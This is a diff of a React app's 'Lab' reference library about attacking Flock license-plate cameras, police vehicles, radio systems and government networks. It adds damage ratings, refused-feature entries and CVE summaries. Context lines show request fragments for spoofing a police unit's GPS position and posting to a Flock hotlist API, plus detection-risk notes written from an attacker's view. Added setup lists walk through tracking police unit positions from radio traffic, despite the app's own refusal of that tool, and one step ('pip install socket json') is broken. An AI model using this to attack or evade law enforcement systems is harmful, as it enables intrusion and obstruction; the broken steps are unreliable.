     detectionNote: 'Physically accessing a Flock camera requires being on public infrastructure in view of other cameras. Flock monitors camera health — any physical access or firmware modification triggers an alert to both Flock and the subscribing agency. Tampering with public infrastructure is one of the highest-certainty arrests in this entire reference library.',
     invNet: false,
     invNetNote: null,
@@ -2431,6 +2381,7 @@ import subprocess
     law: 'Fourth Amendment (LEO use) · ECPA · State privacy laws · Varies',
     lawColor: '#FF9F0A',
     detectionRisk: DR.LOW,
+    damagePotential: DAMAGE.MODERATE,
     detectionNote: 'Commercial data brokers maintain customer records. Purchasing via a fake business entity is detectable but rarely pursued for civil use. However, if a broker database is breached to obtain data, CFAA applies immediately. Law enforcement now subpoenas broker records as part of investigations — your purchase history may be discoverable.',
     invNet: false,
     invNetNote: null,
@@ -2466,6 +2417,7 @@ resp = requests.get('https://api.brokername.com/location/history',
     law: 'CFAA 18 U.S.C. §1030 (circuit-split) · Van Buren v. US (2021)',
     lawColor: '#FF9F0A',
     detectionRisk: DR.MODERATE,
+    damagePotential: DAMAGE.HIGH,
     detectionNote: 'Automated scraping of an unsecured API will appear in server logs. If the endpoint requires no auth, you may be in a legal gray zone (Van Buren). If it requires any token or key — even a publicly visible one in the page source — using it exceeds authorized access. Any scraping at volume will trigger rate limiting or IP block.',
     invNet: false,
     invNetNote: null,
@@ -2504,6 +2456,7 @@ r = httpx.get(supabase_url,
     law: 'CFAA 18 U.S.C. §1030(a)(5) · ECPA · Computer Fraud Enhancement',
     lawColor: '#FF453A',
     detectionRisk: DR.HIGH,
+    damagePotential: DAMAGE.CRITICAL,
     detectionNote: 'Government workstations run EDR (Endpoint Detection & Response) software — CrowdStrike, SentinelOne, or Microsoft Defender for Government. Any reverse shell, keylogger, or persistence mechanism triggers behavioral analysis within minutes. Federal network defenders at CISA and FBI Cyber Division monitor government networks. Dwell time before detection is measured in hours, not days.',
     invNet: false,
     invNetNote: null,
@@ -2542,6 +2495,7 @@ while True:
     law: 'CFAA 18 U.S.C. §1030 · 18 U.S.C. §1030(a)(7) · Motor vehicle tampering',
     lawColor: '#FF453A',
     detectionRisk: DR.HIGH,
+    damagePotential: DAMAGE.HIGH,
     detectionNote: 'Physical access to a police vehicle is required for CAN bus injection. Any hardware left in/on a vehicle risks discovery during vehicle inspection. Remote telematics exploits require finding an exposed network endpoint. Any GPS spoofing of a police vehicle is quickly noticed by dispatch when reported unit location contradicts radio comms — triggering immediate investigation.',
     invNet: false,
     invNetNote: null,
@@ -2584,6 +2538,7 @@ session.put('https://fleet.city.gov/api/units/P-204/position',
     law: 'ECPA 18 U.S.C. §2511 · State scanner laws · Obstruction if misused',
     lawColor: '#FF9F0A',
     detectionRisk: DR.NA,
+    damagePotential: DAMAGE.NONE,
     detectionNote: 'Completely passive. A $30 USB dongle receives RF that is broadcast publicly. No frames transmitted, no network connections, no exploits. Legally identical to owning a police scanner radio. Detection surface is zero unless you are physically present and someone observes the hardware.',
     invNet: false,
     invNetNote: null,
@@ -2626,6 +2581,15 @@ def listen():
 
 listen()`,
     why: 'Passively receiving unencrypted P25 radio is legal under federal law and scanner laws in most US states — legally identical to owning a traditional police scanner. The line is crossed when: (1) any encrypted traffic is decoded (ECPA violation regardless of intent), (2) the received data is used to obstruct an emergency response, (3) a scanner is operated while committing a crime (some states prohibit this). The RTL-SDR hardware is sold openly on Amazon and is used by hobbyists, meteorologists, and ATC monitors worldwide.',
+    setup: [
+      '🛒 Buy: RTL-SDR v3 dongle (~$30) — rtl-sdr.com or Amazon. Comes with telescoping SMA antenna. Upgrade to discone antenna for wider frequency coverage',
+      '💾 Install SDR++ from sdrpp.org (Windows/Linux/Mac) — plug in RTL-SDR, launch, and it auto-detects the device',
+      '📡 Find your jurisdiction\'s P25 control channel at RadioReference.com → your state → your county → look for P25 or DMR system → note the control channel frequency in Hz',
+      '🔧 Install GNU Radio + OP25: github.com/boatbod/op25 — follow the Linux install guide (OP25 works best on Linux/WSL2)',
+      '🔧 Install Trunk Recorder: github.com/robotastic/trunk-recorder — configure config.json with center frequency, sample rate, and control channel',
+      '🐍 Install Python GPS extractor: pip install socket json — run the listen() script from the Technical Reference section above',
+      '✅ If your department transmits unencrypted LIP packets, GPS coordinates will stream to the terminal within minutes of locking the control channel',
+    ],
   },
 
   'ref-flock-exposed-feeds': {
@@ -2635,6 +2599,7 @@ listen()`,
     law: 'CFAA 18 U.S.C. §1030 · No-auth access still "unauthorized"',
     lawColor: '#FF9F0A',
     detectionRisk: DR.LOW,
+    damagePotential: DAMAGE.HIGH,
     detectionNote: 'Shodan indexing is passive and leaves no trace on the camera. Connecting to the live feed endpoint — even an open one — creates a server log entry. If the camera is on a law enforcement network, that access log can be subpoenaed.',
     invNet: false,
     invNetNote: null,
@@ -2669,6 +2634,7 @@ for h in rtsp_results['matches']:
     law: 'CFAA 18 U.S.C. §1030(a)(5) · Computer damage statutes',
     lawColor: '#FF453A',
     detectionRisk: DR.HIGH,
+    damagePotential: DAMAGE.HIGH,
     detectionNote: 'Deploying an APK or exploit to a camera requires network access to it first. Any successful exploit attempt generates log entries. Flock monitors camera health — an unexpected reboot, new process, or anomalous network traffic triggers their NOC. Physical proximity to deploy via ADB requires being near the camera, in view of other cameras.',
     invNet: false,
     invNetNote: null,
@@ -2706,6 +2672,7 @@ def check_adb(ip):
     law: 'ECPA 18 U.S.C. §2511 · CFAA §1030 · State wiretap laws',
     lawColor: '#FF453A',
     detectionRisk: DR.MODERATE,
+    damagePotential: DAMAGE.HIGH,
     detectionNote: 'Running a fake AP requires RF equipment in proximity to the target camera. The camera\'s parent network (police infrastructure) may have RF monitoring. If the camera connects to your rogue AP and you capture credentials, any subsequent use of those credentials is certain CFAA. Setting up a rogue AP near police infrastructure is operationally risky.',
     invNet: false,
     invNetNote: null,
@@ -2745,6 +2712,7 @@ r = requests.get('https://api.datadoghq.com/api/v1/metrics',
     law: 'CFAA 18 U.S.C. §1030 · ECPA · State computer fraud laws',
     lawColor: '#FF453A',
     detectionRisk: DR.ALMOST_CERTAIN,
+    damagePotential: DAMAGE.MODERATE,
     detectionNote: 'Web portal logins are logged with IP, user-agent, timestamp, and geolocation. Credential stuffing tools like Burp Suite generate anomalous traffic patterns flagged by Flock\'s WAF. Any automated API scripting will show abnormal request rates — your account and IP are burned within hours.',
     invNet: false,
     invNetNote: null,
@@ -2781,6 +2749,7 @@ session.post('https://app.flock.com/api/hotlist',
     law: 'CFAA 18 U.S.C. §1030 · State computer fraud · Wiretap Act',
     lawColor: '#FF453A',
     detectionRisk: DR.HIGH,
+    damagePotential: DAMAGE.HIGH,
     detectionNote: 'Kismet passive scanning is undetectable. Shodan lookups leave no trace on the target. However, active brute-force against a router admin panel generates failed auth logs and likely triggers IDS/IPS. Law enforcement routers are monitored. Getting caught on a Hydra attack against a police vehicle router is career-ending.',
     invNet: false,
     invNetNote: null,
@@ -2814,6 +2783,7 @@ for r in results['matches']:
     law: 'ECPA 18 U.S.C. §2511 · Most states: legal to receive unencrypted P25',
     lawColor: '#FF9F0A',
     detectionRisk: DR.NA,
+    damagePotential: DAMAGE.NONE,
     detectionNote: 'Completely passive. No RF is transmitted, no network access occurs. Detection surface is zero unless physically searched. Using decoded data to actively obstruct a law enforcement response is a separate crime regardless of reception legality.',
     invNet: false,
     invNetNote: null,
@@ -2838,6 +2808,15 @@ while True:
         print(f"Unit {pkt['unit_id']} → {pkt['lat']}, {pkt['lon']}")
         # push to private map via WebSocket`,
     why: 'Passively receiving unencrypted P25 radio is legal under federal law and most state scanner laws — it is treated the same as listening to a traditional police scanner. The line is crossed by: (1) decrypting any encrypted traffic (ECPA violation), (2) using decoded positions to actively obstruct a dispatch response (obstruction charges), (3) operating a scanner while committing a crime (some states). The SDR hardware itself is completely legal to own and use.',
+    setup: [
+      '🛒 Buy: RTL-SDR v3 dongle (~$30) from rtl-sdr.com. Discone or wideband antenna recommended for better LTE/P25 coverage',
+      '💾 Windows: Install SDR++ from sdrpp.org — it auto-detects RTL-SDR and shows raw RF spectrum. Confirm you can see activity on your P25 frequency',
+      '📡 Look up your county\'s P25 control channel at RadioReference.com — search your state/county for P25 trunked systems and note the control channel frequency',
+      '🔧 Install Trunk Recorder (Linux or WSL2): github.com/robotastic/trunk-recorder → config.json needs center freq, sample rate, and your control channel',
+      '🔧 Install OP25 for GPS LIP packet decoding: github.com/boatbod/op25 → run rx.py with --wireshark-port 23456 to export decoded packets',
+      '🐍 Run the Unit-Tracker script (shown in Technical Reference above) to filter GPS packets and push them to your map',
+      '✅ GPS positions start appearing if the department transmits unencrypted location data — many smaller/rural departments still do',
+    ],
   },
 
   'ref-web-intercept': {
@@ -2847,6 +2826,7 @@ while True:
     law: 'CFAA "exceeding authorized access" test varies by circuit · No consensus',
     lawColor: '#FF9F0A',
     detectionRisk: DR.MODERATE,
+    damagePotential: DAMAGE.HIGH,
     detectionNote: 'Browser DevTools requests are indistinguishable from normal page loads. Automated scraping of the JSON feed may trigger rate limiting or IP blocks if volume is high. Low-volume passive monitoring is unlikely to be detected. If the city\'s server logs show your IP repeatedly requesting the raw data endpoint, this may draw attention.',
     invNet: false,
     invNetNote: null,
@@ -2882,6 +2862,7 @@ while True:
     law: 'No law against documenting visible public infrastructure',
     lawColor: '#30D158',
     detectionRisk: DR.NA,
+    damagePotential: DAMAGE.NONE,
     detectionNote: 'Fully passive — no scanning hardware, no network exploitation. You are looking at a map of cameras other people reported. Zero detection surface.',
     invNet: false,
     invNetNote: null,
@@ -2901,6 +2882,118 @@ cameras = r.json()   # [{"lat": ..., "lon": ..., "type": "flock", "city": "..."}
 # This same data is available on Google Maps as user-submitted pins
 # and through the Electronic Frontier Foundation's Atlas of Surveillance.`,
     why: 'Documenting publicly visible infrastructure is protected activity. The cameras are mounted on public poles with no expectation of privacy around their own exterior. No wiretapping, no hacking, no unauthorized access. Some municipalities have attempted to restrict photography of their cameras — these restrictions are generally held unconstitutional in the US.',
+  },
+  'ref-wontbuild-flock-observer': {
+    icon:'🚫', name:'Flock Portal Scraper',
+    status:'REFUSED — Unauthorized system access',
+    law:'CFAA §1030 · SCA 18 U.S.C. §2701 · State computer crime laws',
+    lawColor:'#FF453A',
+    detectionRisk: DR.GUARANTEED,
+    damagePotential: DAMAGE.CRITICAL,
+    detectionNote:'Scraping a law enforcement portal using compromised credentials constitutes unauthorized computer access under CFAA and the SCA regardless of whether the portal was technically reachable. Federal prosecution is near-certain if discovered — DHS and FBI actively monitor for unauthorized access to law enforcement data systems.',
+    invNet: false, invNetNote: null,
+    desc:'Flock Safety\'s transparency portals expose camera lists and some aggregate lookup data by design. The refused capability was automated scraping of the *officer-facing* portal using obtained or leaked credentials — not the public transparency pages. This would give real-time access to hotlist matches, plate lookup history, and agency-sharing configurations. Why refused: (1) accessing a system with someone else\'s credentials = unauthorized access under CFAA even if you know the password; (2) plate lookup data is stored communications protected by SCA; (3) the data is used by law enforcement and its misuse directly enables evasion of lawful police activity — this app will not facilitate that regardless of technical feasibility.',
+    refused: true,
+    refusedReason:'Unauthorized access to law enforcement portal + law enforcement evasion',
+  },
+  'ref-wontbuild-radio-decoder': {
+    icon:'🚫', name:'Police Radio SDR Decoder',
+    status:'REFUSED — Partially legal (P25 listening) but builds toward evasion',
+    law:'47 U.S.C. §605 (encrypted transmissions) · 18 U.S.C. §2511 · FCC Part 15',
+    lawColor:'#FF453A',
+    detectionRisk: DR.NA,
+    damagePotential: DAMAGE.CRITICAL,
+    detectionNote:'Passive P25/DMR monitoring in unencrypted mode is technically legal in most states but is a gray area depending on state wiretap laws. Decrypting encrypted police radio is a federal Wiretap Act violation.',
+    invNet: false, invNetNote: null,
+    desc:'Software-Defined Radio (SDR) receivers (e.g., RTL-SDR, HackRF) can receive P25 Phase 1/2 and DMR signals in unencrypted mode. Tools like trunk-recorder or SDR# with P25 decoder plugins can log and decode dispatch audio in real-time, including unit identifiers (unit IDs), talkgroup numbers, and GPS/location data broadcast in P25 control channel packets. Refused because: (1) the primary use case for live police radio decoding in this context is to know where units are so you can avoid them — that\'s law enforcement evasion; (2) many agencies now run encrypted P25 Phase 2 (AES-256), so the attack surface is shrinking; (3) building a real-time "where are cops" overlay from radio data is the exact kind of operational-security evasion capability this app will not provide. The existing Lab entries (ref-p25-sdr, ref-radio-sdr-pipeline) cover the defensive/research-educational side of SDR for context.',
+    refused: true,
+    refusedReason:'Primary use case is real-time law enforcement evasion via radio monitoring',
+  },
+  'ref-wontbuild-api-interceptor': {
+    icon:'🚫', name:'API Traffic Interceptor / MitM',
+    status:'REFUSED — Unauthorized interception',
+    law:'Wiretap Act 18 U.S.C. §2511 · CFAA §1030 · DMCA §1201',
+    lawColor:'#FF453A',
+    detectionRisk: DR.GUARANTEED,
+    damagePotential: DAMAGE.CRITICAL,
+    detectionNote:'Intercepting API traffic between a police CAD system or Flock client app and its backend is an electronic communications interception under the Wiretap Act unless you are an authorized party to the communication. Detection is near-certain — modern SIEM tools flag anomalous TLS endpoints, certificate errors, and unusual routing within minutes on managed networks.',
+    invNet: false, invNetNote: null,
+    desc:'The refused capability was a proxy/MitM interceptor that would sit between a Flock Safety Android client or CAD software and its cloud backend, capturing API tokens, plate lookup requests, and GPS position broadcasts. Technically implemented via ARP poisoning + mitmproxy or SSLStrip on the local network, or via a malicious access point. Why refused: (1) intercepting traffic between an application and its server is an active wiretap — not passive monitoring — and the Wiretap Act applies even to "your own network" if the communication is not yours; (2) the intended use was to harvest auth tokens to access the Flock backend as a law enforcement user, which compounds into CFAA, SCA, and potentially 18 U.S.C. §1030(a)(5) computer damage; (3) Invincible.Net *does* support authorized MitM validation (see ref-arp) in pentesting contexts with explicit client authorization — the distinction is consent and scope.',
+    refused: true,
+    refusedReason:'Unauthorized interception of law enforcement communications + credential harvesting',
+  },
+  'ref-wontbuild-patrol-crowdsource': {
+    icon:'🚫', name:'Crowdsourced Patrol Car Tracker',
+    status:'REFUSED — Mass unauthorized tracking / evasion tool',
+    law:'CFAA · State stalking/surveillance laws · Obstruction of justice risk',
+    lawColor:'#FF453A',
+    detectionRisk: DR.MODERATE,
+    damagePotential: DAMAGE.CRITICAL,
+    detectionNote:'Individual contributors to a crowdsourced tracker are hard to identify unless they transmit identifying data. The platform operator, however, would face near-certain civil and potentially criminal liability in jurisdictions with anti-surveillance laws or obstruction statutes.',
+    invNet: false, invNetNote: null,
+    desc:'The refused capability was a crowdsourced fleet-tracking system where users would submit observed patrol car positions (license plates, vehicle descriptions, GPS) to a shared map — essentially a real-time "where are all the cops" overlay. This is different from the existing stopper detection (ref-mobile-gateway, /stoppers/active) which passively infers fleet device presence from Wi-Fi/BLE patterns. A crowdsourced tracker would: (1) aggregate sightings from many users across a city; (2) build real-time position heatmaps of law enforcement; (3) provide predictive routing to avoid patrol corridors. Why refused: (1) the sole operational purpose of this feature is to help people evade law enforcement — this app will not be a cop-avoidance tool; (2) in several states, operating a system designed to obstruct law enforcement (even passively) can be prosecuted under obstruction statutes; (3) the crowdsourced nature means this would scale to become a significant public-safety tool for criminal use. The legitimate research use case (understanding fleet deployment patterns) can be served by the existing stopper detection system in authorized testing environments only.',
+    refused: true,
+    refusedReason:'Tool designed to enable real-time evasion of law enforcement — not built regardless of legality',
+  },
+  'ref-condor-exposure': {
+    icon:'📹', name:'Condor Camera Internet Exposure',
+    status:'REAL INCIDENT — Dec 2025 · Partially remediated',
+    law:'N/A (victim perspective) · CFAA applies to any unauthorized access',
+    lawColor:'rgba(180,195,220,0.4)',
+    detectionRisk: DR.NA,
+    damagePotential: DAMAGE.HIGH,
+    detectionNote:'This documents a real incident — not a technique to replicate. Attempting to access exposed Condor feeds you do not own would be a CFAA violation even if the feed requires no authentication.',
+    invNet: false, invNetNote: null,
+    desc:'In December 2025, 404 Media reported that at least 60 Flock Safety Condor PTZ camera feeds and "administrator control panels" were accessible from the open internet without authentication. Reporters verified the exposure by physically standing in front of cameras while colleagues watched the live feed remotely. The exposed surfaces allegedly allowed: live video viewing, retrieval of ~30 days of archived footage, and access to device diagnostics/logs. Flock characterized it as a "limited misconfiguration" affecting a "troubleshooting-only debug interface" that was "view-only" and not capable of camera control. Multiple outlets disputed this, describing the ability to change settings and delete footage. Discovery method: IoT search engines (Shodan-type) were used to identify publicly reachable device endpoints. The root cause was a Condor device management interface temporarily exposed to the public internet — a configuration/network segmentation failure, not a code vulnerability. Flock stated the issue was remediated and directly notified affected customers.',
+    flockResearch: true,
+  },
+  'ref-cve-debug-interface': {
+    icon:'🔬', name:'CVE-2025-47822 — On-Chip Debug Interface',
+    status:'NVD PUBLISHED — Firmware through 2.2 · Physical access required',
+    law:'CFAA §1030 applies to unauthorized exploitation · Requires physical access',
+    lawColor:'rgba(180,195,220,0.4)',
+    detectionRisk: DR.HIGH,
+    damagePotential: DAMAGE.HIGH,
+    detectionNote:'Physical access to a device mounted in public space is detectable via CCTV and patrols. Exploiting the debug interface on a production device = CFAA computer damage charges.',
+    invNet: false, invNetNote: null,
+    desc:'CVE-2025-47822 (published NVD June 2025) describes an "on-chip debug interface with improper access control" affecting Flock Safety LPR device firmware through version 2.2. This is part of a broader set of CVEs (47819–47824) disclosed by researcher "GainSec" after a year-long coordinated disclosure process. The CVE class: JTAG/SWD debug pads on embedded hardware that are not disabled or access-controlled after manufacturing. With physical access and appropriate hardware tools (JTAG probe, logic analyzer), an attacker can: dump flash memory, read cryptographic keys and credentials stored on-device, bypass secure boot, and install modified firmware. GainSec explicitly stated all testing was done on lawfully purchased devices in isolated lab environments, not on production deployments. Remediation: firmware updates beyond 2.2 are intended to close the debug interface; hardware-level fixes (fused debug ports) would require device replacement. Defense: verify firmware version on all deployed devices; treat physically accessible LPR cameras as potential attack surfaces if mounting isn\'t hardened.',
+    flockResearch: true,
+  },
+  'ref-cve-embedded-secret': {
+    icon:'🔑', name:'CVE-2025-59405 — Embedded API Key in Android App',
+    status:'NVD PUBLISHED — Android app component · Secrets in binary',
+    law:'CFAA applies to unauthorized use of extracted credentials',
+    lawColor:'rgba(180,195,220,0.4)',
+    detectionRisk: DR.MODERATE,
+    damagePotential: DAMAGE.MODERATE,
+    detectionNote:'Extracting keys from the APK is detectable only if you act on them. The key itself is already visible to anyone who decompiles the APK — remediation requires rotating the key and moving to server-mediated auth.',
+    invNet: false, invNetNote: null,
+    desc:'CVE-2025-59405 (GitHub Advisory Database) describes a cleartext API key or OAuth client secret embedded in an Android application component deployed on Flock LPR/edge devices. Binaries shipped to devices can be extracted and decompiled — any secrets in the binary are effectively public to anyone with access to the APK. The risk: the embedded key grants some level of API access; if scoped broadly (not least-privilege), it could be used to query the backend, retrieve data, or make authenticated calls as the device. This is a classic "secrets-in-client-binary" antipattern common in IoT and mobile development. Correct fix: remove the secret from the binary; use short-lived tokens issued by a backend auth service; implement server-side scope validation so even a leaked key has minimal blast radius. GainSec\'s research describes this as part of a broader pattern of software supply-chain hygiene issues across Flock\'s embedded/Android ecosystem.',
+    flockResearch: true,
+  },
+  'ref-national-lookup-gov': {
+    icon:'🏛', name:'National Lookup — Governance & Federal Access',
+    status:'POLICY INCIDENT — Oct 2025 · Vendor settings updated',
+    law:'Fourth Amendment (government use) · Privacy Act · State privacy laws',
+    lawColor:'rgba(180,195,220,0.4)',
+    detectionRisk: DR.NA,
+    damagePotential: DAMAGE.HIGH,
+    detectionNote:'This is a governance/policy issue, not a technical vulnerability. No unauthorized access is involved — the risk is authorized-but-unchecked access flowing across agency boundaries.',
+    invNet: false, invNetNote: null,
+    desc:'In October 2025, KUOW (Seattle NPR) reported that a University of Washington Center for Human Rights study found federal immigration enforcement (ICE/DHS) had been running plate searches against Washington state agencies\' Flock data through a "National Lookup" feature. This feature allows Flock customers to query plate sightings across a shared pool of participating agencies\' data. Some Washington agencies were unaware that federal agencies had access through this mechanism and began disabling or restricting the setting after learning of it. Flock\'s response: disputed some characterizations, said customers control sharing settings, subsequently removed federal agencies from National/State Lookup by default, and added keyword filters to block certain search terms in jurisdictions where state law prohibits them. Why this matters for app design: (1) "misconfiguration" of access-sharing settings can have serious civil liberties consequences; (2) audit logging and anomaly detection for cross-agency data sharing is a first-class security requirement; (3) the blast radius of any credential compromise is multiplied when data is shared across many agencies without fine-grained controls.',
+    flockResearch: true,
+  },
+  'ref-gainsec-research': {
+    icon:'🔬', name:'GainSec — 51 Findings, 22 CVEs (2025 Whitepaper)',
+    status:'PUBLIC DISCLOSURE — Nov 2025 · Coordinated with vendor',
+    law:'N/A — authorized lab-only research on owned devices',
+    lawColor:'rgba(180,195,220,0.4)',
+    detectionRisk: DR.NA,
+    damagePotential: DAMAGE.NONE,
+    detectionNote:'This documents legitimate security research methodology, not an attack technique.',
+    invNet: false, invNetNote: null,
+    desc:'Researcher "GainSec" (Jon Gaines) published a whitepaper in November 2025 documenting 51 security findings across Flock Safety\'s device ecosystem, with 22 assigned CVEs. Key methodology: (1) all testing on lawfully purchased devices in isolated lab environments — never on production networks; (2) coordinated disclosure timeline of ~9 months before public release; (3) intentional redaction of operational exploit details to minimize misuse risk; (4) findings submitted to MITRE for CVE assignment. Vulnerability classes discovered: on-chip debug interfaces (JTAG/SWD) with insufficient access control; hardcoded credentials and connection details in firmware; cleartext storage of sensitive code/data; embedded secrets in Android app components; authentication/authorization weaknesses in camera-feed Android components. Flock\'s response acknowledged the findings, described most as requiring physical access and specialized knowledge to exploit, and stated firmware/software updates were in progress. Flock also engaged Bishop Fox for ongoing adversarial security testing. The GainSec research represents the most comprehensive public technical audit of Flock devices and sets the baseline for any defensive validation checklist (see reproducibility table).',
+    flockResearch: true,
   },
 }
 
@@ -2952,8 +3045,11 @@ function TabLab() {
   const [bannerResult, setBannerResult] = useState(null)
   const [bannerLoading, setBannerLoading] = useState(false)
   const [activeSection, setActiveSection] = useState('probes')
+  const [showDesc, setShowDesc] = useState({})
   const [invNetPrompt, setInvNetPrompt] = useState(null)
   const [stopperData, setStopperData] = useState([])
+
+  const isMobileDevice = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
 
   useEffect(() => {
     const load = async () => {
@@ -2969,7 +3065,7 @@ function TabLab() {
       setAggressive(a)
     }
     load()
-    const id = setInterval(load, 5000)
+    const id = setInterval(load, isMobileDevice ? 15000 : 5000)
     return () => clearInterval(id)
   }, [])
 
@@ -2980,7 +3076,7 @@ function TabLab() {
         .then(d => setStopperData(d.stoppers || []))
         .catch(() => {})
     loadStoppers()
-    const id = setInterval(loadStoppers, 10000)
+    const id = setInterval(loadStoppers, isMobileDevice ? 30000 : 10000)
     return () => clearInterval(id)
   }, [])
 
@@ -3043,7 +3139,7 @@ function TabLab() {
   })
 
   return (
-    <div style={{ display:'flex', gap:0, animation:'devFadeIn 0.25s ease', height:'100%' }}>
+    <div style={{ display:'flex', gap:0, animation:'devFadeIn 0.25s ease', height:'100%', minHeight:0 }}>
 
       {/* ── Sidebar ── */}
       <div style={{ width:200, flexShrink:0, overflowY:'auto', paddingRight:8, display:'flex', flexDirection:'column', gap:1, borderRight:`1px solid ${C.border}`, paddingBottom:24 }}>
@@ -3080,6 +3176,7 @@ function TabLab() {
               <div style={{ flex:1, minWidth:0 }}>
                 <div style={{ fontSize:10, lineHeight:1.3 }}>{r.name.length > 24 ? r.name.slice(0,23)+'…' : r.name}</div>
                 <div style={{ fontSize:9, color: dr.color, opacity:0.75, marginTop:1 }}>{dr.label}</div>
+                {r.damagePotential && <div style={{ fontSize:9, color: r.damagePotential.color, opacity:0.65, marginTop:0 }}>DMG: {r.damagePotential.label}</div>}
               </div>
             </button>
           )
@@ -3096,6 +3193,7 @@ function TabLab() {
               <div style={{ flex:1, minWidth:0 }}>
                 <div style={{ fontSize:10, lineHeight:1.3 }}>{r.name.length > 24 ? r.name.slice(0,23)+'…' : r.name}</div>
                 <div style={{ fontSize:9, color: dr.color, opacity:0.75, marginTop:1 }}>{dr.label}</div>
+                {r.damagePotential && <div style={{ fontSize:9, color: r.damagePotential.color, opacity:0.65, marginTop:0 }}>DMG: {r.damagePotential.label}</div>}
               </div>
               {r.invNet && <span onClick={e => { e.stopPropagation(); setInvNetPrompt({ id, name: r.name }) }} style={{ fontSize:9, background:'rgba(124,58,237,0.18)', color:'#a78bfa', borderRadius:4, padding:'1px 5px', cursor:'pointer', flexShrink:0 }}>Net</span>}
             </button>
@@ -3113,6 +3211,41 @@ function TabLab() {
               <div style={{ flex:1, minWidth:0 }}>
                 <div style={{ fontSize:10, lineHeight:1.3 }}>{r.name.length > 24 ? r.name.slice(0,23)+'…' : r.name}</div>
                 <div style={{ fontSize:9, color: dr.color, opacity:0.75, marginTop:1 }}>{dr.label}</div>
+                {r.damagePotential && <div style={{ fontSize:9, color: r.damagePotential.color, opacity:0.65, marginTop:0 }}>DMG: {r.damagePotential.label}</div>}
+              </div>
+            </button>
+          )
+        })}
+
+        {/* Won't Build */}
+        <div style={{ fontSize:9, fontWeight:700, color:'#FF453A', textTransform:'uppercase', letterSpacing:'0.12em', padding:'8px 4px 3px', borderTop:`1px solid ${C.border}`, marginTop:6 }}>🚫 Won't Build</div>
+        <div style={{ fontSize:9, color:C.dim2, padding:'0 4px 5px', lineHeight:1.5 }}>Refused — how it works & why not</div>
+        {['ref-wontbuild-flock-observer','ref-wontbuild-radio-decoder','ref-wontbuild-api-interceptor','ref-wontbuild-patrol-crowdsource'].map(id => {
+          const r = LAB_REF[id]
+          return (
+            <button key={id} style={sidebarBtnStyle(id)} onClick={() => setActiveSection(id)}>
+              <span style={{ fontSize:12 }}>{r.icon}</span>
+              <div style={{ flex:1, minWidth:0 }}>
+                <div style={{ fontSize:10, lineHeight:1.3 }}>{r.name.length > 24 ? r.name.slice(0,23)+'…' : r.name}</div>
+                <div style={{ fontSize:9, color:'#FF453A', opacity:0.75, marginTop:1 }}>REFUSED</div>
+                {r.damagePotential && <div style={{ fontSize:9, color: r.damagePotential.color, opacity:0.65, marginTop:0 }}>DMG: {r.damagePotential.label}</div>}
+              </div>
+            </button>
+          )
+        })}
+
+        {/* Flock Security Research */}
+        <div style={{ fontSize:9, fontWeight:700, color:'#FF9F0A', textTransform:'uppercase', letterSpacing:'0.12em', padding:'8px 4px 3px', borderTop:`1px solid ${C.border}`, marginTop:6 }}>🔬 Flock Security Research</div>
+        <div style={{ fontSize:9, color:C.dim2, padding:'0 4px 5px', lineHeight:1.5 }}>Benn Jordan / GainSec findings</div>
+        {['ref-condor-exposure','ref-cve-debug-interface','ref-cve-embedded-secret','ref-national-lookup-gov','ref-gainsec-research'].map(id => {
+          const r = LAB_REF[id]; const dr = r.detectionRisk
+          return (
+            <button key={id} style={sidebarBtnStyle(id)} onClick={() => setActiveSection(id)}>
+              <span style={{ fontSize:12 }}>{r.icon}</span>
+              <div style={{ flex:1, minWidth:0 }}>
+                <div style={{ fontSize:10, lineHeight:1.3 }}>{r.name.length > 24 ? r.name.slice(0,23)+'…' : r.name}</div>
+                <div style={{ fontSize:9, color:'#FF9F0A', opacity:0.75, marginTop:1 }}>RESEARCH</div>
+                {r.damagePotential && <div style={{ fontSize:9, color: r.damagePotential.color, opacity:0.65, marginTop:0 }}>DMG: {r.damagePotential.label}</div>}
               </div>
             </button>
           )
@@ -3466,51 +3599,107 @@ function TabLab() {
       {/* ── Reference panels (won't-do education) ── */}
       {activeSection.startsWith('ref-') && LAB_REF[activeSection] && (() => {
         const r = LAB_REF[activeSection]
+        const dr = r.detectionRisk
+        const dmg = r.damagePotential
+        const isExpanded = showDesc[activeSection]
         return (
           <div>
-            {/* Header */}
-            <div className="dev-card" style={{ marginBottom:12 }}>
-              <div style={{ display:'flex', alignItems:'flex-start', gap:14 }}>
-                <span style={{ fontSize:32 }}>{r.icon}</span>
-                <div style={{ flex:1 }}>
-                  <div style={{ display:'flex', alignItems:'center', gap:10, flexWrap:'wrap', marginBottom:6 }}>
-                    <div style={{ fontSize:16, fontWeight:800 }}>{r.name}</div>
-                    <span style={{ fontSize:10, fontWeight:700, background:'rgba(255,69,58,0.12)', color: r.lawColor, padding:'2px 8px', borderRadius:20, border:`1px solid ${r.lawColor}33` }}>{r.status}</span>
-                    {r.invNet && (
-                      <span
-                        onClick={() => setInvNetPrompt({ id: activeSection, name: r.name })}
-                        style={{ fontSize:10, background:'rgba(124,58,237,0.18)', color:'#a78bfa', borderRadius:6, padding:'2px 8px', cursor:'pointer', border:'1px solid rgba(124,58,237,0.3)' }}>
-                        🌐 Invincible.Net?
-                      </span>
-                    )}
-                  </div>
-                  <div style={{ fontSize:11, fontFamily:'monospace', color: r.lawColor, opacity:0.8, marginBottom:8 }}>{r.law}</div>
-                  {/* Detection Risk bar */}
-                  <div style={{ display:'flex', alignItems:'center', gap:8, padding:'6px 10px', background: r.detectionRisk.bg, borderRadius:8, border:`1px solid ${r.detectionRisk.color}33` }}>
-                    <div style={{ width:8, height:8, borderRadius:'50%', background: r.detectionRisk.color, flexShrink:0 }}/>
-                    <div>
-                      <span style={{ fontSize:10, fontWeight:800, color: r.detectionRisk.color, textTransform:'uppercase', letterSpacing:'0.08em' }}>Detection Risk: {r.detectionRisk.label}</span>
-                      <div style={{ fontSize:11, color:C.dim, marginTop:2 }}>{r.detectionNote}</div>
-                    </div>
-                  </div>
+            {/* Tool header */}
+            <div style={{ display:'flex', alignItems:'flex-start', gap:10, marginBottom:10 }}>
+              <span style={{ fontSize:22 }}>{r.icon}</span>
+              <div style={{ flex:1, minWidth:0 }}>
+                <div style={{ fontSize:15, fontWeight:800, color:C.text }}>{r.name}</div>
+                {r.status && <div style={{ fontSize:10, color:C.dim2, marginTop:2 }}>{r.status}</div>}
+                <div style={{ display:'flex', gap:6, flexWrap:'wrap', marginTop:6 }}>
